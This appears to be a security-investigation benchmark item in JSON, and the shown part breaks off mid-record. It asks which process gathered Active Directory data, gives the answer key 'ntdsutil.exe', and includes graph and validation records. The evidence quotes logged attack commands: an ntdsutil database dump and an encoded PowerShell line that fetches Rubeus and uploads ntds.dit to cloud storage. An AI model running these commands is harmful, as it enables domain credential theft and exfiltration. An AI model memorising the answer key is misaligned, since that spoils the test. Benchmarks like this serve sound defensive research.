@@ -1,0 +1,851 @@
+{
+  "id": "incident_322_train_004",
+  "source_file": "data/excytin-bench/huggingface/questions/train/incident_322_qa_incident_o1-ga_c42.json",
+  "index": 4,
+  "sha256": "af9d019b60fcad75fa00492344563c1969e39aaf80b506c77ed06a9749ad2fb2",
+  "split": "train",
+  "question_record": {
+    "context": "During a recent security investigation, we identified multiple suspicious activities involving various endpoints and alerts. Initially, a connection from IP `231.60.52.209` - `vnevado-win11h.vnevado.alpineskihouse.co` to a malicious URL `login.micro.demo.antoinetest.ovh` was detected in proxy logs. This raised concerns about potential unauthorized access or malicious activities on the affected system.",
+    "question": "As part of our investigation, we also discovered that attackers might be using a certain process to gather information for persistence or lateral movement in the network. Can you identify the file name of the process that was used in this activity?",
+    "answer": "ntdsutil.exe",
+    "solution": [
+      "A malicious URL was detected in proxy logs from the host `vnevado-win11h` with the IP address `231.60.52.209` connecting to `login.micro.demo.antoinetest.ovh`.",
+      "A malicious URL was clicked by the user account `Hailey Johnson`.",
+      "There was an Azure Resource Manager operation from a suspicious proxy IP address linked to the host `vnevado-dc`.",
+      "The attacker used `ntdsutil.exe` to gather Active Directory information."
+    ],
+    "start_alert": 11,
+    "end_alert": 22,
+    "start_entities": [
+      12,
+      14,
+      15
+    ],
+    "end_entities": [
+      20
+    ],
+    "shortest_alert_path": [
+      11,
+      13,
+      33,
+      6,
+      25,
+      21,
+      22
+    ]
+  },
+  "graph_file": "data/excytin-bench/github/secgym/qagen/graph_files/incident_322.graphml",
+  "graph_sha256": "8d2d318a4fcded2f15b1565627612655b20ff74b3984bdbb10a632fdc242080f",
+  "path": [
+    "11",
+    "13",
+    "33",
+    "6",
+    "25",
+    "21",
+    "22"
+  ],
+  "nodes": {
+    "12": {
+      "type": "entity",
+      "node_type": "url",
+      "identifier_fields": "Url",
+      "value": "login.micro.demo.antoinetest.ovh"
+    },
+    "14": {
+      "type": "entity",
+      "node_type": "ip",
+      "identifier_fields": "Address",
+      "value": "231.60.52.209"
+    },
+    "15": {
+      "type": "entity",
+      "node_type": "ip",
+      "identifier_fields": "Address",
+      "value": "228.3.31.94"
+    },
+    "11": {
+      "type": "alert",
+      "name": "Malicious Url detected in Proxy logs",
+      "description": "Connection from 231.60.52.209 - vnevado-win11h.vnevado.alpineskihouse.co to login.micro.demo.antoinetest.ovh has been seen on the proxy, please check on the computer what happened"
+    },
+    "13": {
+      "type": "entity",
+      "node_type": "host",
+      "identifier_fields": "HostName",
+      "value": "vnevado-win11h"
+    },
+    "33": {
+      "type": "alert",
+      "name": "Malicious URL was clicked on that device",
+      "description": "Malicious URL was clicked on that device"
+    },
+    "6": {
+      "type": "entity",
+      "node_type": "account",
+      "identifier_fields": "Name",
+      "value": "Hailey Johnson"
+    },
+    "25": {
+      "type": "alert",
+      "name": "Azure Resource Manager operation from suspicious proxy IP address",
+      "description": "Microsoft Defender for Resource Manager detected a resource management operation from an IP address that is associated with proxy services, such as TOR. While this behavior can be legitimate, it's often seen in malicious activities, when threat actors try to hide their source IP."
+    },
+    "21": {
+      "type": "entity",
+      "node_type": "host",
+      "identifier_fields": "HostName",
+      "value": "vnevado-dc"
+    },
+    "22": {
+      "type": "alert",
+      "name": "Ntdsutil collecting Active Directory information",
+      "description": "Attackers might be using Ntdsutil to gather information for persistence or to move laterally in a network or organization. Ntdsutil is a command line tool that provides management facilities for Active Directory Domain Services (AD DS) and Active Directory Lightweight Directory Services (AD LDS). It was launched to maintain the database of AD DS."
+    },
+    "20": {
+      "type": "entity",
+      "node_type": "process",
+      "identifier_fields": "ExtractedFileName",
+      "value": "ntdsutil.exe"
+    }
+  },
+  "interpretation": {
+    "alerts": 4,
+    "sql_steps_per_variant": 4,
+    "start_alternatives": [
+      {
+        "node": "12",
+        "concept": "URL",
+        "value_literal_in_input": true,
+        "value_casefold_in_input": true
+      },
+      {
+        "node": "14",
+        "concept": "IP_Address",
+        "value_literal_in_input": true,
+        "value_casefold_in_input": true
+      },
+      {
+        "node": "15",
+        "concept": "IP_Address",
+        "value_literal_in_input": false,
+        "value_casefold_in_input": false
+      }
+    ],
+    "target_concept": "Command_File_Mention",
+    "weak_links": [
+      "13",
+      "6",
+      "21"
+    ],
+    "scope": "official graph witness, not a proof of causality, actor identity or autonomous planning"
+  },
+  "merged_pm": "pm_fadada7ead4620d5",
+  "merged_ems": [
+    "em_afdcb0e9dc74c4fe",
+    "em_91337af89e0a799a",
+    "em_d2d12465d7cb1987",
+    "em_8d6469f2573a39ce",
+    "em_a1856eff0c584ee8"
+  ],
+  "offline_validation": [
+    {
+      "variant": "from_IP_Address",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "ok",
+          "row_count": 1,
+          "expected_node": "13",
+          "expected_present": true,
+          "values": [
+            "vnevado-win11h"
+          ],
+          "evidence": [
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win11h",
+              "raw_components": {
+                "HostName": "vnevado-win11h"
+              },
+              "entity_index": 1,
+              "entity_ref": "3",
+              "roles": [],
+              "alert_id": "01a23e9a-b69c-ee97-c5f0-447aaa91df7a",
+              "time": "2024-08-01 12:47:22.846409+00:00",
+              "matched_inputs": [
+                "228.3.31.94",
+                "231.60.52.209"
+              ]
+            }
+          ]
+        },
+        {
+          "step": "T2",
+          "status": "ok",
+          "row_count": 1,
+          "expected_node": "6",
+          "expected_present": true,
+          "values": [
+            "Hailey Johnson"
+          ],
+          "evidence": [
+            {
+              "concept": "Account_Name",
+              "graph_value": "Hailey Johnson",
+              "raw_components": {
+                "Name": "Hailey Johnson"
+              },
+              "entity_index": 1,
+              "entity_ref": "5",
+              "roles": [],
+              "alert_id": "a2fb174d-cdd1-4484-436a-f3cb4c2713bb",
+              "time": "2024-08-01 13:49:58.880422+00:00",
+              "matched_inputs": [
+                "vnevado-win11h"
+              ]
+            }
+          ]
+        },
+        {
+          "step": "T3",
+          "status": "ok",
+          "row_count": 1,
+          "expected_node": "21",
+          "expected_present": true,
+          "values": [
+            "vnevado-dc"
+          ],
+          "evidence": [
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-dc",
+              "raw_components": {
+                "HostName": "vnevado-dc"
+              },
+              "entity_index": 5,
+              "entity_ref": "7",
+              "roles": [],
+              "alert_id": "75013ae0-7504-d192-8aae-90107aa6b19b",
+              "time": "2024-08-01 13:09:13.222398+00:00",
+              "matched_inputs": [
+                "Hailey Johnson"
+              ]
+            }
+          ]
+        },
+        {
+          "step": "T4",
+          "status": "ok",
+          "row_count": 2,
+          "expected_node": "20",
+          "expected_present": true,
+          "values": [
+            "ntdsutil.exe",
+            "powershell.exe"
+          ],
+          "evidence": [
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "powershell.exe",
+              "raw_components": {
+                "CommandLine": "\"powershell.exe\" -EncodedCommand IABuAHQAZABzAHUAdABpAGwALgBlAHgAZQAgACcAYQBjACAAaQAgAG4AdABkAHMAJwAgACcAaQBmAG0AJwAgACcAYwByAGUAYQB0AGUAIABmAHUAbABsACAAYwA6AFwAdABlAG0AcAAnACAAcQAgAHEAOwAgACAAdwBnAGUAdAAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgAzAG0AbwB0AGUAYwBvAG4AdAByAG8AbAAvAEcAaABvAHMAdABwAGEAYwBrAC0AQwBvAG0AcABpAGwAZQBkAEIAaQBuAGEAcgBpAGUAcwAvAHIAYQB3AC8AbQBhAHMAdABlAHIALwBSAHUAYgBlAHUAcwAuAGUAeABlACAALQBvAHUAdABmAGkAbABlACAAdABlAHMAdAAuAGUAeABlACAALQB1AHMAZQBiAGEAcwBpAGMAcABhAHIAcwBpAG4AZwA7ACAAIABpAG4AdgBvAGsAZQAtAHIAZQBzAHQAbQBlAHQAaABvAGQAIAAtAG0AZQB0AGgAbwBkACAAZwBlAHQAIAAtAHUAcgBpACAAdgBlAGMAdABvAHIAcwBhAG4AZABhAHIAcgBvAHcAcwAuAGMAbwBtACAALQB1AHMAZQBiAGEAcwBpAGMAcABhAHIAcwBpAG4AZwA7ACAAIABpAG4AcwB0AGEAbABsAC0AbQBvAGQAdQBsAGUAIABhAHoALgBhAGMAYwBvAHUAbgB0AHMAIAAtAHMAYwBvAHAAZQAgAEMAdQByAHIAZQBuAHQAVQBzAGUAcgAgAC0ARgBvAHIAYwBlADsAIABpAG4AcwB0AGEAbABsAC0AbQBvAGQAdQBsAGUAIABhAHoALgBzAHQAbwByAGEAZwBlACAAIAAtAHMAYwBvAHAAZQAgAEMAdQByAHIAZQBuAHQAVQBzAGUAcgAgAC0ARgBvAHIAYwBlADsAIAAgAEMAbwBuAG4AZQBjAHQALQBBAHoAQQBjAGMAbwB1AG4AdAAgAC0ASQBkAGUAbgB0AGkAdAB5ADsAIAAgACQARgBpAGwAZQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAD0AIAAnAGMAOgBcAHQAZQBtAHAAXABBAGMAdABpAHYAZQAgAEQAaQByAGUAYwB0AG8AcgB5AFwAbgB0AGQAcwAuAGQAaQB0ACcAOwAgACAAJABzACAAPQAgAGcAZQB0AC0AYQB6AHMAdABvAHIAYQBnAGUAQQBjAGMAbwB1AG4AdAA7ACAAIAAkAGMAbwBuAHQAZQB4AHQAIAA9ACAAJABzAC4AQwBvAG4AdABlAHgAdAA7ACAAIAAkAEMAbwBuAHQAYQBpAG4AZQByAE4AYQBtAGUAIAA9ACAAIgBhAHUAdABvAG0AYQB0AGkAbwBuACIAOwAgACAAJABCAGwAbwBiADMASABUACAAPQAgAEAAewAgACAAIAAgACAARgBpAGwAZQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAD0AIAAkAEYAaQBsAGUAOwAgACAAIAAgACAAQwBvAG4AdABhAGkAbgBlAHIAIAAgACAAIAAgACAAIAAgAD0AIAAkAEMAbwBuAHQAYQBpAG4AZQByAE4AYQBtAGUAOwAgACAAIAAgACAAQgBsAG8AYgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAD0AIAAnAEkAbQBhAGcAZQAwADAAMwAuAGoAcABnACcAOwAgACAAIAAgACAAQwBvAG4AdABlAHgAdAAgACAAIAAgACAAIAAgACAAIAAgAD0AIAAkAGMAbwBuAHQAZQB4AHQAOwAgACAAIAAgACAAUwB0AGEAbgBkAGEAcgBkAEIAbABvAGIAVABpAGUAcgAgAD0AIAAnAEEAcgBjAGgAaQB2AGUAJwA7ACAAIAAgAH0AOwAgAFMAZQB0AC0AQQB6AFMAdABvAHIAYQBnAGUAQgBsAG8AYgBDAG8AbgB0AGUAbgB0ACAAQABCAGwAbwBiADMASABUADsAIAAgAA=="
+              },
+              "entity_index": 0,
+              "entity_ref": "2",
+              "roles": [],
+              "alert_id": "73846159-bcd1-d7a5-ecca-f46ec2a26bd6",
+              "time": "2024-08-01 12:54:34.046089+00:00",
+              "matched_inputs": [
+                "vnevado-dc"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "ntdsutil.exe",
+              "raw_components": {
+                "CommandLine": "\"ntdsutil.exe\" \"ac i ntds\" ifm \"create full c:\\temp\" q q"
+              },
+              "entity_index": 6,
+              "entity_ref": "8",
+              "roles": [],
+              "alert_id": "73846159-bcd1-d7a5-ecca-f46ec2a26bd6",
+              "time": "2024-08-01 12:54:34.046089+00:00",
+              "matched_inputs": [
+                "vnevado-dc"
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "variant": "from_URL",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "status": "ok",
+          "row_count": 1,
+          "expected_node": "13",
+          "expected_present": true,
+          "values": [
+            "vnevado-win11h"
+          ],
+          "evidence": [
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win11h",
+              "raw_components": {
+                "HostName": "vnevado-win11h"
+              },
+              "entity_index": 1,
+              "entity_ref": "3",
+              "roles": [],
+              "alert_id": "01a23e9a-b69c-ee97-c5f0-447aaa91df7a",
+              "time": "2024-08-01 12:47:22.846409+00:00",
+              "matched_inputs": [
+                "login.micro.demo.antoinetest.ovh"
+              ]
+            }
+          ]
+        },
+        {
+          "step": "T2",
+          "status": "ok",
+          "row_count": 1,
+          "expected_node": "6",
+          "expected_present": true,
+          "values": [
+            "Hailey Johnson"
+          ],
+          "evidence": [
+            {
+              "concept": "Account_Name",
+              "graph_value": "Hailey Johnson",
+              "raw_components": {
+                "Name": "Hailey Johnson"
+              },
+              "entity_index": 1,
+              "entity_ref": "5",
+              "roles": [],
+              "alert_id": "a2fb174d-cdd1-4484-436a-f3cb4c2713bb",
+              "time": "2024-08-01 13:49:58.880422+00:00",
+              "matched_inputs": [
+                "vnevado-win11h"
+              ]
+            }
+          ]
+        },
+        {
+          "step": "T3",
+          "status": "ok",
+          "row_count": 1,
+          "expected_node": "21",
+          "expected_present": true,
+          "values": [
+            "vnevado-dc"
+          ],
+          "evidence": [
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-dc",
+              "raw_components": {
+                "HostName": "vnevado-dc"
+              },
+              "entity_index": 5,
+              "entity_ref": "7",
+              "roles": [],
+              "alert_id": "75013ae0-7504-d192-8aae-90107aa6b19b",
+              "time": "2024-08-01 13:09:13.222398+00:00",
+              "matched_inputs": [
+                "Hailey Johnson"
+              ]
+            }
+          ]
+        },
+        {
+          "step": "T4",
+          "status": "ok",
+          "row_count": 2,
+          "expected_node": "20",
+          "expected_present": true,
+          "values": [
+            "ntdsutil.exe",
+            "powershell.exe"
+          ],
+          "evidence": [
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "powershell.exe",
+              "raw_components": {
+                "CommandLine": "\"powershell.exe\" -EncodedCommand IABuAHQAZABzAHUAdABpAGwALgBlAHgAZQAgACcAYQBjACAAaQAgAG4AdABkAHMAJwAgACcAaQBmAG0AJwAgACcAYwByAGUAYQB0AGUAIABmAHUAbABsACAAYwA6AFwAdABlAG0AcAAnACAAcQAgAHEAOwAgACAAdwBnAGUAdAAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgAzAG0AbwB0AGUAYwBvAG4AdAByAG8AbAAvAEcAaABvAHMAdABwAGEAYwBrAC0AQwBvAG0AcABpAGwAZQBkAEIAaQBuAGEAcgBpAGUAcwAvAHIAYQB3AC8AbQBhAHMAdABlAHIALwBSAHUAYgBlAHUAcwAuAGUAeABlACAALQBvAHUAdABmAGkAbABlACAAdABlAHMAdAAuAGUAeABlACAALQB1AHMAZQBiAGEAcwBpAGMAcABhAHIAcwBpAG4AZwA7ACAAIABpAG4AdgBvAGsAZQAtAHIAZQBzAHQAbQBlAHQAaABvAGQAIAAtAG0AZQB0AGgAbwBkACAAZwBlAHQAIAAtAHUAcgBpACAAdgBlAGMAdABvAHIAcwBhAG4AZABhAHIAcgBvAHcAcwAuAGMAbwBtACAALQB1AHMAZQBiAGEAcwBpAGMAcABhAHIAcwBpAG4AZwA7ACAAIABpAG4AcwB0AGEAbABsAC0AbQBvAGQAdQBsAGUAIABhAHoALgBhAGMAYwBvAHUAbgB0AHMAIAAtAHMAYwBvAHAAZQAgAEMAdQByAHIAZQBuAHQAVQBzAGUAcgAgAC0ARgBvAHIAYwBlADsAIABpAG4AcwB0AGEAbABsAC0AbQBvAGQAdQBsAGUAIABhAHoALgBzAHQAbwByAGEAZwBlACAAIAAtAHMAYwBvAHAAZQAgAEMAdQByAHIAZQBuAHQAVQBzAGUAcgAgAC0ARgBvAHIAYwBlADsAIAAgAEMAbwBuAG4AZQBjAHQALQBBAHoAQQBjAGMAbwB1AG4AdAAgAC0ASQBkAGUAbgB0AGkAdAB5ADsAIAAgACQARgBpAGwAZQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAD0AIAAnAGMAOgBcAHQAZQBtAHAAXABBAGMAdABpAHYAZQAgAEQAaQByAGUAYwB0AG8AcgB5AFwAbgB0AGQAcwAuAGQAaQB0ACcAOwAgACAAJABzACAAPQAgAGcAZQB0AC0AYQB6AHMAdABvAHIAYQBnAGUAQQBjAGMAbwB1AG4AdAA7ACAAIAAkAGMAbwBuAHQAZQB4AHQAIAA9ACAAJABzAC4AQwBvAG4AdABlAHgAdAA7ACAAIAAkAEMAbwBuAHQAYQBpAG4AZQByAE4AYQBtAGUAIAA9ACAAIgBhAHUAdABvAG0AYQB0AGkAbwBuACIAOwAgACAAJABCAGwAbwBiADMASABUACAAPQAgAEAAewAgACAAIAAgACAARgBpAGwAZQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAD0AIAAkAEYAaQBsAGUAOwAgACAAIAAgACAAQwBvAG4AdABhAGkAbgBlAHIAIAAgACAAIAAgACAAIAAgAD0AIAAkAEMAbwBuAHQAYQBpAG4AZQByAE4AYQBtAGUAOwAgACAAIAAgACAAQgBsAG8AYgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAD0AIAAnAEkAbQBhAGcAZQAwADAAMwAuAGoAcABnACcAOwAgACAAIAAgACAAQwBvAG4AdABlAHgAdAAgACAAIAAgACAAIAAgACAAIAAgAD0AIAAkAGMAbwBuAHQAZQB4AHQAOwAgACAAIAAgACAAUwB0AGEAbgBkAGEAcgBkAEIAbABvAGIAVABpAGUAcgAgAD0AIAAnAEEAcgBjAGgAaQB2AGUAJwA7ACAAIAAgAH0AOwAgAFMAZQB0AC0AQQB6AFMAdABvAHIAYQBnAGUAQgBsAG8AYgBDAG8AbgB0AGUAbgB0ACAAQABCAGwAbwBiADMASABUADsAIAAgAA=="
+              },
+              "entity_index": 0,
+              "entity_ref": "2",
+              "roles": [],
+              "alert_id": "73846159-bcd1-d7a5-ecca-f46ec2a26bd6",
+              "time": "2024-08-01 12:54:34.046089+00:00",
+              "matched_inputs": [
+                "vnevado-dc"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "ntdsutil.exe",
+              "raw_components": {
+                "CommandLine": "\"ntdsutil.exe\" \"ac i ntds\" ifm \"create full c:\\temp\" q q"
+              },
+              "entity_index": 6,
+              "entity_ref": "8",
+              "roles": [],
+              "alert_id": "73846159-bcd1-d7a5-ecca-f46ec2a26bd6",
+              "time": "2024-08-01 12:54:34.046089+00:00",
+              "matched_inputs": [
+                "vnevado-dc"
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "live_validation": [
+    {
+      "variant": "route_b03c412889e33f1a",
+      "seed_concept": "IP_Address",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "episode_id": "em_8d6469f2573a39ce",
+          "status": "ok",
+          "candidate_count": 2,
+          "unique_values": [
+            "vnevado-win11h"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "01a23e9a-b69c-ee97-c5f0-447aaa91df7a",
+          "witnesses": [
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win11h",
+              "raw_components": {
+                "HostName": "vnevado-win11h"
+              },
+              "roles": [],
+              "entity_index": 1,
+              "alert_id": "01a23e9a-b69c-ee97-c5f0-447aaa91df7a",
+              "time": "2024-08-01 12:47:22.846409+00:00",
+              "source_row_hash": "ae03d11e7f149f378769b621731325e7bb1178e06651eecffb5efa9dcf8b555d",
+              "matched_inputs": [
+                "228.3.31.94"
+              ]
+            },
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win11h",
+              "raw_components": {
+                "HostName": "vnevado-win11h"
+              },
+              "roles": [],
+              "entity_index": 1,
+              "alert_id": "01a23e9a-b69c-ee97-c5f0-447aaa91df7a",
+              "time": "2024-08-01 12:47:22.846409+00:00",
+              "source_row_hash": "ae03d11e7f149f378769b621731325e7bb1178e06651eecffb5efa9dcf8b555d",
+              "matched_inputs": [
+                "231.60.52.209"
+              ]
+            }
+          ],
+          "witness_count": 2,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'IP_Address' AND o.Concept = 'Host_Name'\n  AND i.GraphValue IN (%s,%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Malicious Url detected in Proxy logs",
+            "228.3.31.94",
+            "231.60.52.209"
+          ],
+          "error": null
+        },
+        {
+          "step": "T2",
+          "episode_id": "em_a1856eff0c584ee8",
+          "status": "ok",
+          "candidate_count": 2,
+          "unique_values": [
+            "Hailey Johnson"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "a2fb174d-cdd1-4484-436a-f3cb4c2713bb",
+          "witnesses": [
+            {
+              "concept": "Account_Name",
+              "graph_value": "Hailey Johnson",
+              "raw_components": {
+                "Name": "Hailey Johnson"
+              },
+              "roles": [],
+              "entity_index": 1,
+              "alert_id": "a2fb174d-cdd1-4484-436a-f3cb4c2713bb",
+              "time": "2024-08-01 15:49:16.174289+00:00",
+              "source_row_hash": "13cb36022c5413f8bd014ff061235891865d6fa97760496848638bfe7a44d95a",
+              "matched_inputs": [
+                "vnevado-win11h"
+              ]
+            },
+            {
+              "concept": "Account_Name",
+              "graph_value": "Hailey Johnson",
+              "raw_components": {
+                "Name": "Hailey Johnson"
+              },
+              "roles": [],
+              "entity_index": 1,
+              "alert_id": "a2fb174d-cdd1-4484-436a-f3cb4c2713bb",
+              "time": "2024-08-01 13:49:58.880422+00:00",
+              "source_row_hash": "1d7035906796aa632e754d53dddab2609eba23dcc6df3533a41f98eb08f1ef09",
+              "matched_inputs": [
+                "vnevado-win11h"
+              ]
+            }
+          ],
+          "witness_count": 2,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Host_Name' AND o.Concept = 'Account_Name'\n  AND i.GraphValue IN (%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Malicious URL was clicked on that device",
+            "vnevado-win11h"
+          ],
+          "error": null
+        },
+        {
+          "step": "T3",
+          "episode_id": "em_d2d12465d7cb1987",
+          "status": "ok",
+          "candidate_count": 1,
+          "unique_values": [
+            "vnevado-dc"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "75013ae0-7504-d192-8aae-90107aa6b19b",
+          "witnesses": [
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-dc",
+              "raw_components": {
+                "HostName": "vnevado-dc"
+              },
+              "roles": [],
+              "entity_index": 5,
+              "alert_id": "75013ae0-7504-d192-8aae-90107aa6b19b",
+              "time": "2024-08-01 13:09:13.222398+00:00",
+              "source_row_hash": "58d5cca40807405b1938095c897d9089f9708466f5900c38900c7e77efbae7c4",
+              "matched_inputs": [
+                "Hailey Johnson"
+              ]
+            }
+          ],
+          "witness_count": 1,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Account_Name' AND o.Concept = 'Host_Name'\n  AND i.GraphValue IN (%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Azure Resource Manager operation from suspicious proxy IP address",
+            "Hailey Johnson"
+          ],
+          "error": null
+        },
+        {
+          "step": "T4",
+          "episode_id": "em_afdcb0e9dc74c4fe",
+          "status": "ok",
+          "candidate_count": 4,
+          "unique_values": [
+            "ntdsutil.exe",
+            "powershell.exe"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "73846159-bcd1-d7a5-ecca-f46ec2a26bd6",
+          "witnesses": [
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "ntdsutil.exe",
+              "raw_components": {
+                "CommandLine": "\"ntdsutil.exe\" \"ac i ntds\" ifm \"create full c:\\temp\" q q"
+              },
+              "roles": [],
+              "entity_index": 6,
+              "alert_id": "73846159-bcd1-d7a5-ecca-f46ec2a26bd6",
+              "time": "2024-08-02 22:34:59.610648+00:00",
+              "source_row_hash": "3bca5da11d047320b7327c017f314b4b3fc21e3bbb513e0493f6664a75087a7e",
+              "matched_inputs": [
+                "vnevado-dc"
+              ]
+            },
+            {
+              "concept": "Command_File_Mention",
+              "graph_value": "ntdsutil.exe",
+              "raw_components": {
+                "CommandLine": "\"ntdsutil.exe\" \"ac i ntds\" ifm \"create full c:\\temp\" q q"
+              },
+              "roles": [],
+              "entity_index": 6,
+              "alert_id": "73846159-bcd1-d7a5-ecca-f46ec2a26bd6",
+              "time": "2024-08-01 12:54:34.046089+00:00",
+              "source_row_hash": "f4ab4db470c5b49df82c825038ca00f1d67b2c1dab48f3a1bcf1a7c41119a29d",
+              "matched_inputs": [
+                "vnevado-dc"
+              ]
+            }
+          ],
+          "witness_count": 2,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Host_Name' AND o.Concept = 'Command_File_Mention'\n  AND i.GraphValue IN (%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Ntdsutil collecting Active Directory information",
+            "vnevado-dc"
+          ],
+          "error": null
+        }
+      ]
+    },
+    {
+      "variant": "route_b03c412889e33f1a",
+      "seed_concept": "URL",
+      "passed": true,
+      "steps": [
+        {
+          "step": "T1",
+          "episode_id": "em_91337af89e0a799a",
+          "status": "ok",
+          "candidate_count": 1,
+          "unique_values": [
+            "vnevado-win11h"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "01a23e9a-b69c-ee97-c5f0-447aaa91df7a",
+          "witnesses": [
+            {
+              "concept": "Host_Name",
+              "graph_value": "vnevado-win11h",
+              "raw_components": {
+                "HostName": "vnevado-win11h"
+              },
+              "roles": [],
+              "entity_index": 1,
+              "alert_id": "01a23e9a-b69c-ee97-c5f0-447aaa91df7a",
+              "time": "2024-08-01 12:47:22.846409+00:00",
+              "source_row_hash": "ae03d11e7f149f378769b621731325e7bb1178e06651eecffb5efa9dcf8b555d",
+              "matched_inputs": [
+                "login.micro.demo.antoinetest.ovh"
+              ]
+            }
+          ],
+          "witness_count": 1,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'URL' AND o.Concept = 'Host_Name'\n  AND i.GraphValue IN (%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
+            "Malicious Url detected in Proxy logs",
+            "login.micro.demo.antoinetest.ovh"
+          ],
+          "error": null
+        },
+        {
+          "step": "T2",
+          "episode_id": "em_a1856eff0c584ee8",
+          "status": "ok",
+          "candidate_count": 2,
+          "unique_values": [
+            "Hailey Johnson"
+          ],
+          "expected_present": true,
+          "query_count": 1,
+          "expected_alert_id": "a2fb174d-cdd1-4484-436a-f3cb4c2713bb",
+          "witnesses": [
+            {
+              "concept": "Account_Name",
+              "graph_value": "Hailey Johnson",
+              "raw_components": {
+                "Name": "Hailey Johnson"
+              },
+              "roles": [],
+              "entity_index": 1,
+              "alert_id": "a2fb174d-cdd1-4484-436a-f3cb4c2713bb",
+              "time": "2024-08-01 15:49:16.174289+00:00",
+              "source_row_hash": "13cb36022c5413f8bd014ff061235891865d6fa97760496848638bfe7a44d95a",
+              "matched_inputs": [
+                "vnevado-win11h"
+              ]
+            },
+            {
+              "concept": "Account_Name",
+              "graph_value": "Hailey Johnson",
+              "raw_components": {
+                "Name": "Hailey Johnson"
+              },
+              "roles": [],
+              "entity_index": 1,
+              "alert_id": "a2fb174d-cdd1-4484-436a-f3cb4c2713bb",
+              "time": "2024-08-01 13:49:58.880422+00:00",
+              "source_row_hash": "1d7035906796aa632e754d53dddab2609eba23dcc6df3533a41f98eb08f1ef09",
+              "matched_inputs": [
+                "vnevado-win11h"
+              ]
+            }
+          ],
+          "witness_count": 2,
+          "sql": "SELECT DISTINCT o.AlertId, o.AlertTitle, o.ObservedAt, o.EntityIndex,\n       o.GraphValue AS value, o.RawComponents, o.Roles, o.SourceRowHash,\n       i.GraphValue AS matched_input\nFROM LTMInputEvidence i\nJOIN LTMEntityEvidence o ON o.SourceRowHash = i.SourceRowHash\nWHERE i.AlertTitle = %s\n  AND i.Concept = 'Host_Name' AND o.Concept = 'Account_Name'\n  AND i.GraphValue IN (%s)\nORDER BY o.AlertId, o.SourceRowHash, o.EntityIndex, o.GraphValue, i.GraphValue\nLIMIT 501",
+          "parameters": [
